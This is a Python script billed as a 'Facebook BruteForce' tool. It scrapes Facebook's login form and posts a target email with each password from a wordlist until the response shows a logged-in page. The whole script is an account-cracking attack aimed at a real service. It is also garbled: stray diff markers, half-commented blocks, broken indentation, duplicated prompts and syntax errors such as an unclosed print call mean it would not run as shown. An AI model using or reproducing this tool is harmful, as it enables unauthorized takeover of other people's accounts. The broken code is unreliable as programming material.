import requests
import threading
import urllib.request
import os
from bs4 import BeautifulSoup
import sys
try:
#if sys.version_info[0] < 3:
        raise "REQUIRED PYTHON 3.x"
except Exception as ex:
#print('''               --------------------------------------
                        #REQUIRED PYTHON 3.x
                        #use: python3 fb.py
                        #Send your problems on https://m.me/B14CKH4K3R
                #--------------------------------------

#if sys.version_info[0] !=3: 
        #print('''--------------------------------------
        #required python 3.x
        #use: python3 fb.py
        #Send your problems on https://m.me/B14CKH4K3R
#--------------------------------------
#                        ''')
        #sys.exit()
#post_url='https://www.facebook.com/login.php'
#headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'
payload={}
cookie={}

def create_form():
        form=dict()
        cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

        data=requests.get(post_url,headers=headers)
        print('Form Creating : ',data.url)
        print('Return Status : ',data.status_code)
        for i in data.headers:
               print(i,' : ',data.headers[i])
        for i in data.cookies:
                cookie[i.name]=i.value
        data=BeautifulSoup(data.text,'html.parser').form
#@42,31 +39,25 @@ def function(email,passw,i):
        payload,cookie=create_form()
        payload['email']=email
        payload['pass']=passw
print(payload)
print(cprint(cookie)
print('lsd : ',payload['lsd'])
     print(cookie)
        r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
        if 'Find Friends' in r.text:
                print('password is ',passw)
                #open('d.html','w').write(r.text)
                open('temp','w').write(str(r.content))
                print('\npassword is : ',passw)
                return True
        return False

#payload=create_form()
print('___________________________________________________________________________\n')
print('\n---------- Welcome To Facebook BruteForce ----------\n')
file=open('passwords.txt','r')

email=input('Enter Email/:Username  ')

print("\nTarget Email ID : ",email)
print("\nTrying Passwords from list ...")

i=0
email=input('Enter Email : ')
print("")
print("Target Email ID : ",email)
print("")
while file:
        passw=file.readline().strip()
        i+=1
        print("Trying Password " + str(i) +": ",passw)
        print(str(i) +" : ",passw)
        if function(email,passw,i):
                break
                # os.system('pause')